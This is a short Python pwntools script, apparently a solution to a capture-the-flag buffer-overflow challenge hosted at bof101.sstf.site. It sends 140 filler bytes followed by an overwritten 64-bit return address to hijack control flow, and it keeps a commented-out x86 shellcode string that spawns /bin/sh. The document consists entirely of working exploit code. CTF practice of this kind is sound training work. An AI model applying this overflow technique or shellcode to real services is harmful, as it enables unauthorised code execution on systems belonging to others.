from pwn import *

p = remote("bof101.sstf.site", 1336)

ret_address = int(b"0x55555555477a",16) #이나 b안붙이나 똑같음.

#code = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"
code = b"\x80"*140
code += p64(ret_address)


print(p.recv(1024))

p.sendline(code)
print(p.recv(1024))
print(p.recv(1024))

p.close()